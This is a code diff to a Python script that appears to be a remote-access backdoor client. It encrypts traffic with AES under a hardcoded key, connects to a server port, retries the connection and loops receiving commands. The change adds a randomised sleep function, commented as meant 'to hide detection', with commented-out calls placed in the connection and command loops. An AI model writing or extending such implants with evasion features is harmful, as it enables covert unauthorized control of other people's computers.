@@ -7,6 +7,7 @@ import subprocess
 import os
 import argparse
 import base64
+import random
 
 from Crypto.Cipher import AES
 
@@ -28,6 +29,9 @@ SERVER_PORT = 8887
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
 
+#Step 5: randomzed sleep interval to hide detection
+def random_sleep(min_seconds, max_second):
+    time.sleep(random.uniform(min_seconds, max_second))
 
 def encrypt(msg):
   cipher = AES.new(key, AES.MODE_EAX)
@@ -72,6 +76,7 @@ def recv_command():
         return None
 
 
+
 def create_connection():
     while True:
         time.sleep(20)
@@ -82,10 +87,15 @@ def create_connection():
             break
         except:
             create_connection()
+            # random sleep between 1min to 3 mins
+            #random_sleep(60, 180)
+
+   
 
 
 def work():
     while True:
+        #random_sleep(60, 180)
         command = recv_command()
         if command == 'quit' or command == 'exit':
             break
